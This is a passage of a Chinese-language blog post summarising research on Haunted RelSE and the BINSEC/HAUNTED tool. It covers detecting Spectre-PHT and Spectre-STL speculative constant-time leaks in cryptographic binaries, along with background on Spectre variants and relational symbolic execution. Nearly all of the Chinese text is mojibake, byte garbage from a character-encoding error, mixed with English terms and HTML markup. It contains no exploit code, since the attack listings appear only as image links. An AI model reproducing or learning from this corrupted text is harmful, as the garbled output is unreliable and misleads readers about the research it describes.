programmingï¼‰ï¼Œæ•…æˆ‘ä»¬çš„åˆ†æåœ¨äºŒè¿›åˆ¶å±‚æ“ä½œï¼ˆæ— éœ€æºç ï¼‰ã€‚æœ¬æ–‡å°†å‰äººçš„æ¨¡å‹æ‰©å±•åˆ°å¸¸æ•°æ—¶é—´äºŒè¿›åˆ¶åˆ†æä¸Šï¼Œä»¥åˆ†æ  <em>æ¨æµ‹å¸¸æ•°æ—¶é—´</em>  </p><p><strong>ç¬¦å·æ‰§è¡Œ</strong>ï¼ˆsymbolic executionï¼‰æ˜¯ä¸€é¡¹åœ¨äºŒè¿›åˆ¶ä»£ç ä¸Šæ‰©å±•è‰¯å¥½çš„æŠ€æœ¯ï¼Œä½†ä¸ºäº†åˆ†ææ¨æµ‹å¸¸æ•°æ—¶é—´ï¼Œå…¶å¿…é¡»è€ƒè™‘ç¨‹åºçš„æ¨æµ‹è¡Œä¸ºã€‚Spectre-PHT ä¸ Spectre-STL çš„ç¬¦å·åˆ†æè€…é€šè¿‡ fork ä»¥æ¢ç´¢ä¸´æ—¶è·¯å¾„ï¼Œä»è€Œå¯¹æ¨æµ‹æ€§è¡Œä¸ºè¿›è¡Œ <em>æ¸…æ™°åœ°</em>  ï¼ˆexplicitlyï¼‰å»ºæ¨¡ï¼Œè€Œè¿™å¯¼è‡´äº†çŠ¶æ€çˆ†ç‚¸â€”â€”å°¤å…¶æ˜¯å¯¹ Spectre-STL è€Œè¨€ã€‚å¯¹ç¬¦å·æ‰§è¡Œçš„å¸¸æ•°æ—¶é—´æ ·å¼ï¼ˆconstant-time-likeï¼‰çš„å±æ€§çš„æ”¹é€ ï¼Œç§°ä¸º  <em>å…³ç³»ç¬¦å·æ‰§è¡Œ</em>  ï¼ˆrelational symbolic executionï¼Œ RelSEï¼‰ï¼Œåœ¨äºŒè¿›åˆ¶å±‚é¢çš„å¯ä¼¸ç¼©æ€§ä¸ç²¾åº¦ä¸Šå·²è¢«è¯æ˜æ˜¯éå¸¸æˆåŠŸçš„</p><p>ä¸ºäº†è§£å†³ C2ï¼Œæœ¬æ–‡çš„æ ¸å¿ƒæŠ€æœ¯æ˜¯åˆ©ç”¨ RelSE æ¥  <em>åœ¨åŒä¸€æ—¶é—´</em> åƒå¸¸è§„æ‰§è¡Œï¼ˆå³ï¼Œä¸æ­£ç¡®çš„æ¨æµ‹ç›¸å…³çš„æ‰§è¡Œï¼‰ é‚£æ ·æ‰§è¡Œä¸´æ—¶çš„æ‰§è¡Œï¼›æœ¬æ–‡å°†è¿™ç§æŠ€æœ¯å‘½åä¸º <code>Haunted RelSE</code>ï¼š</p><ul><li>å¯¹äº Spectre-PHTï¼Œå…¶é€šè¿‡åŒæ—¶æ‰§è¡Œç”±æ¡ä»¶è¯­å¥äº§ç”Ÿçš„ç¬æ€çš„ä¸å¸¸è§„çš„è·¯å¾„ä»¥å¯¹å¤šä½™çŠ¶æ€è¿›è¡Œå‰ªæ</li><li>å¯¹äº Spectre-STLï¼Œå…¶å¯¹å¤šä½™çŠ¶æ€è¿›è¡Œå‰ªæå¹¶å°†å‰©ä½™éƒ¨åˆ†ç¼–ç åœ¨ä¸€ä¸ªå•ç‹¬çš„ç¬¦å·è·¯å¾„ä¸­ï¼Œè€Œéä¸ºæ¯ä¸ªå¯èƒ½çš„åŠ è½½ä¸å­˜å‚¨äº¤å‰å°†ç¬¦å·æ‰§è¡Œè¿›è¡Œåˆ†æ”¯</li></ul><p>æœ¬æ–‡åœ¨ä¸€ä¸ªäºŒè¿›åˆ¶å±‚çš„å…³ç³»ç¬¦å·åˆ†æå·¥å…· BINSEC&#x2F;HAUNTED ä¸­åº”ç”¨ Haunted RelSEï¼Œä¸ºäº†è¿›è¡Œè¯„ä¼°ï¼Œæœ¬æ–‡ä½¿ç”¨äº† Spectre-PHT çš„è‘—åæµ‹è¯•ç”¨ä¾‹ Kocher ï¼Œä»¥åŠä¸€ç»„ä¸º Spectre-STL æå‡ºçš„æ–°æµ‹è¯•ç”¨ä¾‹ï¼Œä»¥åŠæ¥è‡ª donnaã€Libsodium ä¸ OpenSSL åº“çš„çœŸå®ä¸–ç•Œå¯†ç å­¦ä»£ç </p><p><strong>Findings.</strong> æœ¬æ–‡çš„å·¥ä½œå±•ç¤ºäº†ä¸€ç§ç”¨äºå¯¹æŠ— Spectre-PHT çš„è‘—åé˜²å¾¡æ‰‹æ®µ index-masking å¯èƒ½ä¼šå¼•å…¥æ–°çš„ Spectre-STL æ¼æ´ï¼Œå¹¶æå‡ºä¸”éªŒè¯äº†ç”¨ä»¥è§£å†³è¿™ä¸ªé—®é¢˜çš„å®‰å…¨å®ç°ï¼Œé€šè¿‡æœ¬æ–‡çš„å·¥å…·è¿˜å‘ç°äº† GCC ä¸­ä¸€ä¸ªæµè¡Œçš„ç”¨ä»¥ç”Ÿæˆä½ç½®æ— å…³ä»£ç ï¼ˆposition-independent codeï¼‰çš„é€‰é¡¹å¯èƒ½å¼•å…¥ Spectre-STL æ¼æ´ï¼ŒåŒæ—¶è¿˜ç¡®è®¤äº†ç”±ç¼–è¯‘å™¨æ·»åŠ çš„æ ˆä¿æŠ¤åœ¨å¯†ç åŸè¯­ï¼ˆcryptographic primitivesï¼‰ä¸­å¼•å…¥äº† Spectre violations</p><p><strong>Contributions.</strong> æ€»ç»“èµ·æ¥æœ¬æ–‡çš„å·¥ä½œå°±æ˜¯ï¼š</p><ul><li>ç ”ç©¶è€…è®¾è®¡äº†ä¸€ç§åŸºäºå…³ç³»ç¬¦å·æ‰§è¡Œçš„æŠ€æœ¯ï¼Œç§°ä¹‹ä¸º <code>Haunted Relse</code>ï¼Œç”¨ä»¥åœ¨ç¬¦å·åˆ†æä¸­é«˜æ•ˆåœ°åˆ†ææ¨æµ‹æ‰§è¡Œï¼Œä»¥æ£€æµ‹ PHT ä¸ STL Spectreï¼ˆSection III &amp; IVï¼‰ï¼›<code>Haunted Relse</code> çš„åŸºæœ¬æ€æƒ³æ˜¯åŒæ—¶åŸºäºå¸¸è§„çš„ä¸ç¬æ€çš„è¡Œä¸ºè¿›è¡Œç¬¦å·åŒ–æ¨æ–­ï¼Œå°½ç®¡ç ”ç©¶è€…å¯¹å†…å­˜çš„ç¼–ç è®©äººè”æƒ³åˆ°ä¸€äº›çŠ¶æ€åˆå¹¶çš„ç¼–ç ï¼Œä½†å®é™…ä¸Šå…¶éµå¾ªäº†ä¸åŒçš„ç†è®ºï¼Œé€šè¿‡é˜²æ­¢å¸¸è§„ä¸ç¬æ€æ‰§è¡Œä¹‹é—´çš„äººå·¥é˜»æ–­ï¼Œè€Œéè¯•å›¾å°†ä¸åŒçš„è·¯å¾„ï¼ˆå¯èƒ½ä¸ç›¸å…³ï¼‰æ‰“åŒ…åœ¨ä¸€èµ·ï¼›ç ”ç©¶è€…æ­£å¼è¯æ˜äº†æ˜¾å¼åœ°å¯¹æ‰€æœ‰çš„æ¨æµ‹è·¯å¾„å»ºæ¨¡è¿›è¡Œå…³ç³»åˆ†æä¸ä½¿ç”¨ Haunted Relse åœ¨è¯­ä¹‰ä¸Šç­‰ä»·ï¼ˆSection IVï¼‰</li><li>ç ”ç©¶è€…æå‡ºäº†ä¸€ç§åä¸º <code>BINSEC/HAUNTED</code> çš„éªŒè¯å·¥å…·ï¼Œå®ç°äº† <code>Haunted Relse</code>ï¼Œå¹¶é€šè¿‡è‘—åçš„ç”¨äº spectre-PHT çš„ litmus test è¿›è¡Œè¯„ä¼°ï¼›ç ”ç©¶è€…è¿˜è¿›ä¸€æ­¥åœ°æå‡ºä¸€ç»„ç”¨äº Spectre-STL çš„ litmus test ä¸”ç”¨å…¶æµ‹è¯•äº† <code>BINSEC/HAUNTED</code>ï¼›è¯•éªŒçš„è¯„ä¼°æ˜¾ç¤ºäº† <code>BINSEC/HAUNTED</code> å¯ä»¥åœ¨å¦‚ OpenSSLã€donnaã€Libsodium è¿™æ ·çš„çœŸå®ä¸–ç•Œçš„å¯†ç å­¦ä»£ç ä¸­å‘ç°æ¨æµ‹å¸¸æ•°æ—¶é—´æ¼æ´ï¼›å¯¹äº Spectre-PHTï¼Œ<code>BINSEC/HAUNTED</code> æœ€å¤šå¯ä»¥åˆ†æ 5k æ¡é™æ€æŒ‡ä»¤ï¼Œå¹¶æ¯”ç°æœ‰æ°´å¹³çš„  KLEESpectre ä¸ Pitchfork æ›´å¿«ï¼ˆä½†ç²¾å‡†åº¦æ›´ä½ï¼‰ï¼›å¯¹äº Spectre-STLï¼Œå…¶å¯ä»¥æœ€å¤šåˆ†æ 100 æ¡æŒ‡ä»¤å¹¶åœ¨é«˜è¾¾ 6k æ¡æŒ‡ä»¤çš„ä»£ç ä¸­æ‰¾åˆ°æ¼æ´ï¼›ç›¸æ¯”äº Pitchforkï¼Œ<code>BINSEC/HAUNTED</code> æ˜æ˜¾æ›´å¿«ï¼Œä¸”èƒ½æ‰¾åˆ°æ›´å¤šçš„æ¼æ´å¹¶æŠ¥å‘Šæ›´å¤šçš„ä¸å®‰å…¨ç¨‹åº</li><li>æ®ç ”ç©¶è€…æ‰€çŸ¥ï¼Œå…¶ç¬¬ä¸€ä¸ªæŠ¥å‘Šäº†è‘—åçš„ç”¨äºå¯¹æŠ— Spectre-PHT çš„é˜²æŠ¤ <code>index-masking</code> æœ‰å¯èƒ½å¼•å…¥ Spectre-STL æ¼æ´ï¼›ç ”ç©¶è€…æå‡ºäº†ç”¨ä»¥ä¿®å¤è¿™ä¸ªé—®é¢˜çš„æ­£ç¡®å®ç°ï¼ˆSection VIï¼‰ï¼Œå¹¶ç”¨å…¶å·¥å…·è¿›è¡Œäº†éªŒè¯ï¼›ç ”ç©¶è€…åŒæ—¶è¿˜ç¬¬ä¸€ä¸ªæŠ¥å‘Šäº† GCC ç¼–è¯‘å™¨çš„ PIC é€‰é¡¹å¼•å…¥äº† Spectre-STL æ¼æ´ï¼ˆSection VIï¼‰</li></ul><p><strong>Discussion.</strong> å½“ Spectre attacks å¼€å¯äº†ç³»ç»Ÿå®‰å…¨çš„æ–°æˆ˜åœºï¼Œå¯¹æ¨æµ‹æ‰§è¡Œçš„æ€è€ƒå˜å¾—å›°éš¾ä¸”å†—é•¿ï¼Œè¿™éœ€è¦è‡ªåŠ¨æœç´¢æŠ€æœ¯ï¼Œä½†ç”±äºé¢å¤–çš„æ¨æµ‹è¡Œä¸ºå¼•èµ·çš„è·¯å¾„çˆ†ç‚¸ï¼Œæ­¤å‰çš„ææ¡ˆéƒ½å­˜åœ¨å¯æ‰©å±•æ€§é—®é¢˜ï¼Œ<code>Haunted RelSE</code> æ˜¯å‘ç€å¯æ‰©å±•çš„å¯¹ Spectre attacks çš„åˆ†æè¿ˆå‡ºçš„ä¸€æ­¥ï¼›å¯¹äº Spectre-PHTï¼ŒHaunted RelSE å¯ä»¥åœ¨ä¸€äº›æƒ…å†µä¸‹æé«˜åˆ†æé€Ÿåº¦ï¼Œå¯¹åˆ†ææ¨æµ‹è¯­ä¹‰çš„å¤æ‚æ€§è¿›è¡Œå‰ªæï¼Œå¹¶ç¼©æ”¾äºä¸­ç­‰å¤§å°çš„çœŸå®ä¸–ç•Œä¸­çš„å¯†ç å­¦äºŒè¿›åˆ¶æ–‡ä»¶ï¼›å¯¹äº Spectre-STLï¼Œå…¶ä¸ºç¬¬ä¸€ä¸ªå¯ä»¥å½»åº•åˆ†æå°çš„çœŸå®ä¸–ç•Œå¯†ç å­¦äºŒè¿›åˆ¶æ–‡ä»¶çš„å·¥å…·ï¼Œå¹¶èƒ½åœ¨ä¸­ç­‰å¤§å°çš„çœŸå®ä¸–ç•Œå¯†ç å­¦äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ‰¾åˆ°æ¼æ´</p><h1 id="0x02-BACKGROUND"><a href="#0x02-BACKGROUND" class="headerlink" title="0x02. BACKGROUND"></a>0x02. BACKGROUND</h1><p>æœ¬èŠ‚ç ”ç©¶è€…æä¾›äº†å…³äº Spectre çš„åŸºæœ¬èƒŒæ™¯ï¼šæ¨æµ‹å¸¸æ•°æ—¶é—´ï¼ˆspeculative constant-timeï¼‰ä¸å…³ç³»ç¬¦å·æ‰§è¡Œï¼ˆrelational symbolic executionï¼‰</p><p><strong>Spectre attacks.</strong> åœ¨ç°ä»£å¤„ç†å™¨ä¸­ï¼Œåªè¦æŒ‡ä»¤çš„æ“ä½œæ•°å¯ç”¨ï¼Œå…¶è¢«æŒ‰é¡ºåºè·å–å¹¶å­˜æ”¾åœ¨ä¸€ä¸ª <em>é‡æ’åºç¼“å†²åŒº</em> ï¼ˆreorder bufferï¼‰ä¸­ï¼Œä¸”èƒ½æŒ‰ä»»æ„é¡ºåºæ‰§è¡Œï¼›å¤„ç†å™¨åŒæ—¶ä½¿ç”¨<strong>æ¨æµ‹</strong>ï¼ˆspeculationï¼‰æœºåˆ¶ä»¥åœ¨ç‰¹å®šæŒ‡ä»¤æ‰§è¡Œä¹‹å‰é¢„æµ‹å…¶è¾“å‡ºï¼Œç”±è¯¯åˆ¤å¸¦æ¥çš„æŒ‡ä»¤æµâ€”â€”å³ <em>ç¬æ€æ‰§è¡Œ</em> ï¼ˆtransient executionï¼‰ä¼šè¢«åœ¨æ¶æ„çº§è¿˜åŸï¼ˆä¾‹å¦‚æ¢å¤å¯„å­˜å™¨çš„å€¼ï¼‰ï¼Œä½†è¿™å¯èƒ½é—ç•™å¾®æ¶æ„çº§çš„ä¾§é¢å½±å“ï¼ˆä¾‹å¦‚ cache çš„çŠ¶æ€å¯èƒ½ä¸ä¼šè¢«æ¢å¤ï¼‰ï¼Œè€Œè¿™äº›å¾®æ¶æ„çº§çš„ä¾§é¢å½±å“å¯¹ç¨‹åºæ˜¯é€æ˜çš„ï¼Œè¿™ä½¿å¾—æ”»å‡»è€…å¯ä»¥è¿›è¡Œä¾§ä¿¡é“æ”»å‡»ï¼Œ<strong>å¹½çµæ”»å‡»</strong>ï¼ˆSpectre attacksï¼‰ ä¾¿æ˜¯åˆ©ç”¨è¿™ç§æ¨æµ‹æœºåˆ¶æ¥è§¦å‘è¿™æ ·çš„ä¼šåœ¨å¾®æ¶æ„çº§å­˜å‚¨ç§˜å¯†æ•°æ®çš„ç¬æ€æ‰§è¡Œâ€”â€”ç§°ä¹‹ä¸º <code>spectre gadgets</code>ï¼Œè¿™å°†è¢«é€šè¿‡ä¾§ä¿¡é“æ”»å‡»è¿›è¡Œå¤åŸ</p><p>å¹½çµæ”»å‡»ä¸€å…±æœ‰å››ç§æ ¹æ®é’ˆå¯¹çš„æœºåˆ¶çš„ä¸åŒå˜ç§ï¼š</p><ul><li><code>Spectre-PHT</code>ï¼šå¯¹ç”¨ä»¥é¢„æµ‹æ¡ä»¶åˆ†æ”¯çš„ <code>Pattern History Table</code> è¿›è¡Œåˆ©ç”¨</li><li><code>Spectre-BHB</code>ï¼šå¯¹ç”¨ä»¥é¢„æµ‹åˆ†æ”¯åœ°å€çš„ <code>Branch Target Buffer </code>è¿›è¡Œåˆ©ç”¨</li><li><code>Spectre-RSB</code>ï¼šå¯¹ç”¨ä»¥é¢„æµ‹è¿”å›åœ°å€çš„ <code>Return Stack Buffer </code>è¿›è¡Œåˆ©ç”¨</li><li><code>Spectre-STL</code>ï¼šå¯¹ç”¨ä»¥é¢„æµ‹ <code>Store-To-Load dependencies</code> çš„æ¶ˆæ­§ä¹‰æœºåˆ¶è¿›è¡Œåˆ©ç”¨</li></ul><p>å¯¹ BTB ä¸ RSB å˜ç§çš„æ¨æµ‹æœºåˆ¶ï¼Œå¯èƒ½ä¼šè¢«è¯¯è®¤ä¸ºä»»æ„åœ°å€è·³è½¬ï¼Œè¿™å¯¹é™æ€åˆ†æè€Œè¨€æ¯”è¾ƒæ£˜æ‰‹ï¼ˆå‚è§ Section VIIï¼‰ï¼Œæ•…ç ”ç©¶è€…ä¸»è¦å…³æ³¨ Spectre-PHT ä¸ Spectre-STL</p><p><strong>Spectre-PHT.</strong> <code>Pattern History Table</code> ç”¨ä»¥åœ¨å¾®æ¶æ„çº§é¢„æµ‹æ¡ä»¶åˆ†æ”¯çš„è¾“å‡ºï¼›æˆ‘ä»¬é¦–å…ˆä»‹ç» Spectre çš„å˜ç§ 1ï¼Œæ”»å‡»è€…æ»¥ç”¨åˆ†æ”¯é¢„æµ‹å™¨ä»¥æ•…æ„åœ¨ä¸€ä¸ªåˆ†æ”¯è¿›è¡Œé”™è¯¯çš„æ¨æµ‹ï¼›å³ä½¿ç¨‹åºä¸­çš„æ¡ä»¶è¯­å¥åœ¨æ¶æ„çº§ç¡®ä¿äº†å†…å­˜è®¿é—®çš„èŒƒå›´å›ºå®šï¼Œæ”»å‡»è€…å¯ä»¥å¼•å¯¼ PHT é”™è¯¯é¢„æµ‹ä¸€ä¸ªåˆ†æ”¯çš„å€¼ä»¥ç¬æ€æ‰§è¡Œä¸€ä¸ªè¶Šç•Œå†…å­˜è®¿é—®ï¼Œè¿™åœ¨ç¼“å­˜ä¸­ç•™ä¸‹å¯ä»¥è¢«è§‚æµ‹åˆ°çš„ä¸”èƒ½è¢«ç”¨ä»¥æ¢å¤è¶Šç•Œè¯»çš„æ•°æ®çš„å½±å“ï¼ˆListing 1ï¼‰</p><p><img src="https://s2.loli.net/2023/01/25/WZD6Vx1YTv3koiG.png" alt="Listing 1: Illustration of a Spectre-PHT attack."></p><p><strong>Spectre-STL.</strong> <code>Store-To-Load dependencies</code> éœ€è¦åœ¨æ‰€æœ‰çš„ store æŒ‡ä»¤å®Œæˆæ‰§è¡Œå‰ load æŒ‡ä»¤ä¸ä¼šæ‰§è¡Œï¼Œä¸ºäº†è®© CPU ç¬æ€æ‰§è¡Œ store æŒ‡ä»¤å¹¶é¿å…ç¼“å­˜æœªå‘½ä¸­å¯¼è‡´çš„æš‚åœï¼Œstore æŒ‡ä»¤ä»¥é˜Ÿåˆ—å½¢å¼å­˜æ”¾åœ¨ä¸€ä¸ª <code>store buffer</code> ä¸­ï¼Œè€Œç›¸è¾ƒäºç­‰å¾…å…ˆå‰çš„ store æŒ‡ä»¤å®Œæˆï¼Œload æŒ‡ä»¤å¯ä»¥ç›´æ¥ä»åŒ¹é…çš„å¸¦æœ‰ <em>store-to-load forwarding</em> çš„ <code>store buffer </code> ä¸­å–å€¼ï¼›æ­¤å¤–ï¼Œå½“å†…å­˜æ¶ˆæ­§ä¹‰å™¨ï¼ˆmemory disambiguatorï¼‰é¢„æµ‹åˆ°ä¸€ä¸ª loadæŒ‡ä»¤å¹¶éç­‰å¾…ä¸­çš„ store çš„åˆ«åï¼Œå…¶å¯ä»¥ <em>æ¨æµ‹æ€§åœ°ç»•è¿‡åœ¨ store buffer ä¸­ç­‰å¾…ä¸­çš„ store</em> å¹¶ç›´æ¥ä»ä¸»å­˜å–å€¼ï¼›Spectre-STL åˆ©ç”¨è¿™ç§è¡Œä¸ºæ¥è½½å…¥ä¼šè¢«ç¼–ç äºç¼“å­˜ä¸­çš„åŒ…å«ç§˜å¯†æ•°æ®çš„æ—§å€¼ï¼ˆListing 2ï¼‰</p><p><img src="https://s2.loli.net/2023/01/25/r7wLWqOlckJHzbK.png" alt="Listing 2: Illustration of a Spectre-STL attack."></p><p><strong>Speculative constant-time</strong>ï¼ˆSCTï¼‰. å¸¸æ•°æ—¶é—´ï¼ˆconstant timeï¼‰æ˜¯å¯†ç å­¦ä»£ç ä¸­ä¸€ä¸ªæµè¡Œçš„ç¼–ç¨‹è§„èŒƒï¼šç¨‹åºä¸ä¼šå­˜å‚¨ã€è£…è½½ç§˜å¯†æ•°æ®å€¼æˆ–æ˜¯ä»¥å…¶è¿›è¡Œåˆ†æ”¯ï¼Œä»¥é¿å…ä¾§ä¿¡é“æ•°æ®æ³„éœ²ï¼›ç„¶è€Œå¸¸æ•°æ—¶é—´å¹¶ä¸è¶³ä»¥é¢„é˜²å¹½çµæ”»å‡»ï¼Œå¦‚ Listing 1 ä¸ºä¸€ä¸ªå¸¸è§„çš„æ²¡æœ‰å¯¹ç§˜å¯†æ•°æ®çš„è®¿é—®æˆ–ä»¥å…¶åˆ†æ”¯çš„å¸¸æ•°æ—¶é—´ç¨‹åºï¼Œä½†è¯¥ç¨‹åºå­˜åœ¨ Spectre-PHT æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥è¯¯å¯¼å¼è®­ç»ƒåˆ†æ”¯é¢„æµ‹å™¨å¹¶åœ¨ç¬æ€æ‰§è¡Œä¸­æ³„éœ²ç§˜å¯†æ•°æ®ï¼›æ¨æµ‹å¸¸æ•°æ—¶é—´æ˜¯æœ€è¿‘çš„ä¸€ä¸ªæ‰©å±•å¸¸æ•°æ—¶é—´ä»¥è€ƒè™‘ç¬æ€æ‰§è¡Œçš„å®‰å…¨å±æ€§</p><p><strong>Definition 1</strong>ï¼ˆSpeculative constant-timeï¼‰. å½“ä¸”ä»…å½“ä¸€ä¸ªç¨‹åºçš„æ¯ä¸€å¯¹ï¼ˆæ¨æµ‹ï¼‰æ‰§è¡Œæœ‰ç€ç›¸åŒçš„å…¬å…±è¾“å…¥å¹¶åå®šäº†æ¨æµ‹å†³ç­–ã€ä¸”äº’ç›¸çš„æ§åˆ¶æµä¸å†…å­˜è®¿é—®éƒ½ç›¸ç­‰æ—¶ï¼Œè¯¥ç¨‹åºå…³äºæ¨æµ‹å¸¸æ•°æ—¶é—´æ˜¯å®‰å…¨çš„ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ SCTï¼ˆç±»ä¼¼äºå¸¸æ•°æ—¶é—´ä¸å…¶ä»–ä¿¡æ¯æµå±æ€§ï¼‰å¹¶éä¸€ä¸ªæ‰§è¡Œè½¨è¿¹çš„å±æ€§ï¼Œè€Œä¸ä¸¤ä¸ªæ‰§è¡Œè½¨è¿¹ç›¸å…³è”ï¼Œå› æ­¤éœ€è¦è¿‘ä¼¼å·¥å…·ä»¥é«˜æ•ˆåœ°å»ºæ¨¡è½¨è¿¹å¯¹</p><p><strong>Binary-level symbolic execution.</strong> ç¬¦å·æ‰§è¡Œï¼ˆSymbolic Executionï¼‰å³ä½¿ç”¨ç¬¦å·è¾“å…¥æ‰§è¡Œç¨‹åºï¼Œå…¶ä¼šæ„å»ºä¸€ä¸ªç§°ä¸º <em>è·¯å¾„è°“è¯­</em> ï¼ˆpath predicateï¼‰çš„é€»è¾‘è¡¨è¾¾å¼ï¼Œç”¨ä»¥ä¿å­˜åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­é‡åˆ°çš„åˆ†æ”¯æ¡ä»¶ï¼›ä¸ºäº†ç¡®è®¤ä¸€æ¡è·¯å¾„æ˜¯å¦èƒ½é€šï¼Œè·¯å¾„è°“è¯­ä¼šè¢«äº¤ç»™å¯æ»¡è¶³æ€§æ¨¡ç†è®ºæ±‚è§£å™¨ï¼ˆSMT solverï¼‰è¿›è¡Œæ±‚è§£ï¼›ç¬¦å·æ‰§è¡ŒåŒæ—¶è¿˜èƒ½æ£€æŸ¥æ–­è¨€ä»¥å¯»æ‰¾æ¼æ´æˆ–æ˜¯è¿›è¡Œæœ‰ç•ŒéªŒè¯ï¼ˆå³ï¼Œåœ¨ä¸€ä¸ªç¡®å®šçš„æ·±åº¦ä¸‹è¿›è¡ŒéªŒè¯ï¼‰</p><p>åˆ†æäºŒè¿›åˆ¶ä»£ç é€šå¸¸é‡‡ç”¨å°†ä»£ç æŒ‡ä»¤è§£ç ä¸ºä¸€ç§ä½çº§çš„ä¸­é—´è¯­è¨€çš„å½¢å¼ï¼Œåœ¨äºŒè¿›åˆ¶çº§çš„ç¬¦å·æ‰§è¡Œä¸­çš„å€¼ï¼ˆå¦‚å¯„å­˜å™¨ã€å†…å­˜åœ°å€ã€å†…å­˜å†…å®¹ç­‰ï¼‰ä¸ºå›ºå®šå¤§å°çš„ç¬¦å·ä½å‘é‡ï¼Œå†…å­˜è¢«è¡¨ç¤ºä¸ºä¸€ä¸ªç”¨ 32 ä½çš„ä½å‘é‡è¡¨ç¤ºåœ°å€çš„ç¬¦å·å­—èŠ‚æ•°ç»„ï¼Œä¸€ä¸ªç¬¦å·æ•°ç»„ä¸ºä¸€ä¸ªé€šè¿‡å¦‚ä¸‹æ“ä½œå°†æ¯ä¸ªä¸‹æ ‡ <code>i âˆˆ I</code> æ˜ å°„åˆ°å¯¹åº”å€¼ <code>v âˆˆ V</code> çš„å‡½æ•°ï¼ˆ<code>Array I V</code>ï¼‰ï¼š</p><ul><li><code>select</code>ï¼š<code>(Array I V) Ã— I â†’ V</code> è·å–ä¸€ä¸ªæ•°ç»„ <code>a</code> ä¸ä¸€ä¸ªä¸‹æ ‡ <code>i</code>ï¼Œè¿”å›ä¸€ä¸ªå­˜å‚¨åœ¨æ•°ç»„ <code>a</code> çš„ä¸‹æ ‡ <code>i</code> çš„å€¼ <code>v</code></li><li><code>store</code>ï¼š<code>(Array I V) Ã— I Ã— V â†’ (Array I V)</code>  è·å–ä¸€ä¸ªæ•°ç»„ <code>a</code> ã€ä¸€ä¸ªä¸‹æ ‡ <code>i</code> ä¸ä¸€ä¸ªå€¼ <code>v</code>ï¼Œè¿”å›å°†ä¸‹æ ‡ <code>i</code> æ˜ å°„åˆ°å€¼ <code>v</code> çš„æ•°ç»„ <code>a</code></li></ul><p><strong>Relational Symbolic Execution.</strong> <code>å…³ç³»ç¬¦å·æ‰§è¡Œ</code>ï¼ˆRelSEï¼‰æ˜¯ä¸€ç§æœ‰å‰æ™¯çš„å°†ç¬¦å·æ‰§è¡Œè¿›è¡Œæ‰©å±•ä»¥åˆ†æå¦‚ SCT è¿™æ ·çš„ä¸¤ä¸ªæ‰§è¡Œè·¯å¾„çš„å®‰å…¨å±æ€§çš„æ–¹æ³•ï¼Œå…¶ç¬¦å·åŒ–åœ°åœ¨ç›¸åŒçš„ç¬¦å·æ‰§è¡Œå®ä¾‹ä¸­æ‰§è¡Œä¸€ä¸ªç¨‹åºçš„ä¸¤ä¸ªç‰ˆæœ¬å¹¶åœ¨å…¶ä¹‹é—´æœ€å¤§åŒ–å…±æœ‰éƒ¨åˆ†ï¼›ä»¥åˆ†æå¸¸æ•°æ—¶é—´ä¸ºä¾‹ï¼ŒRelSE è®©ä¸¤ä¸ªç¨‹åº <em>å…±äº«ç›¸åŒçš„å…¬æœ‰è¾“å…¥</em> ï¼ˆpublic inputï¼‰ï¼Œä½†ä½¿ç”¨ä¸åŒçš„ <em>ç§˜å¯†è¾“å…¥</em>  ï¼ˆsecret inputï¼‰ï¼Œå¹¶åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æ£€æŸ¥æ˜¯å¦æ¡ä»¶åˆ†æ”¯çš„è¾“å‡ºä¸å†…å­˜ä¸‹æ ‡åœ¨ä¸¤ä¸ªæ‰§è¡Œä¸­å¿…é¡»ä¸€è‡´â€”â€”è¿™ä»£è¡¨å…¶æ˜¯å¦å†³å®šäºç§˜å¯†</p><p>åœ¨ RelSE ä¸­ï¼Œå˜é‡è¢«æ˜ å°„åˆ° <em>å…³ç³»è¡¨è¾¾å¼</em> ï¼ˆrelational expressionï¼‰ä¸­ï¼Œå½“å…¶å¯èƒ½ä¾èµ–äºç§˜å¯†æ•°æ®æ—¶ï¼Œå…¶ä¸ºä¸€å¯¹ç¬¦å·è¡¨è¾¾å¼ï¼ˆè¡¨ç¤ºä¸º <code>&lt;Ï•l | Ï•r&gt;</code> ï¼‰ï¼Œå¦åˆ™ä¸ºä¸€ä¸ªç®€å•çš„ç¬¦å·è¡¨è¾¾å¼ï¼ˆè¡¨ç¤ºä¸º <code>&lt;Ï•&gt;</code> ï¼‰ï¼›ä¸ºäº†å¯¹å†…å­˜è®¿é—®ä¸æ¡ä»¶æŒ‡ä»¤è¿›è¡Œå®‰å…¨è¯„ä¼°ï¼Œç ”ç©¶è€…ä½¿ç”¨å¦‚ä¸‹å®šä¹‰çš„å‡½æ•° <code>secLeak</code> ä»¥ç¡®ä¿ä¸€ä¸ªå…³ç³»è¡¨è¾¾å¼å¹¶ä¸å†³å®šäºç§˜å¯†ï¼ˆå³ï¼Œè¡¨è¾¾å¼å·¦å³å†…å®¹å¿…é¡»ç›¸ç­‰ï¼‰ï¼š</p><p><img src="https://s2.loli.net/2023/01/27/mAty1adqCrk49UV.png" alt="image.png"></p><p><code>|=</code> è¡¨ç¤ºå¯æ»¡è¶³ï¼ˆåä¹‹è¡¨ç¤ºä¸æ»¡è¶³ï¼‰ï¼Œå…¶ä¾èµ–äºè¿™æ ·ä¸€ä¸ªäº‹å®ï¼šè‹¥ $\widehat{\varphi}$ ä¸ºä¸€ä¸ªç®€å•çš„è¡¨è¾¾å¼ï¼Œå‚ç…§å®šä¹‰ï¼Œå…¶å¹¶ä¸ä¾èµ–äºç§˜å¯†ï¼Œå› è€Œå¯ä»¥è¢«å®‰å…¨åœ°æ³„éœ²ï¼›ç„¶è€Œè‹¥ $\widehat{\varphi}$  ä¸ºä¸€å¯¹è¡¨è¾¾å¼  <code>&lt;Ï•l | Ï•r&gt;</code> ï¼Œä»…å½“ <code>Ï•l</code> ä¸ <code>Ï•r</code> åœ¨å½“å‰è·¯å¾„è°“è¯­ <code>Ï€</code> ä¸‹ä¸å¯è¢«ç¡®è®¤æ—¶ï¼ˆå³è¡¨è¾¾å¼ <code>Ï€ âˆ§ Ï•l â‰  Ï•r</code> ä¸å¯è¢«æ»¡è¶³ï¼‰ï¼Œæ³„éœ²æ‰æ˜¯å®‰å…¨çš„</p><p><strong>Notations.</strong> å¤§å°ä¸º <code>n</code> çš„ç¬¦å·ä½å‘é‡çš„é›†åˆè¡¨ç¤ºä¸º <em>Bv<sub>n</sub></em> ï¼Œç¬¦å·è¡¨è¾¾å¼ï¼ˆä½å‘é‡æˆ–æ•°ç»„ï¼‰  <em>Ï•, Ï•l 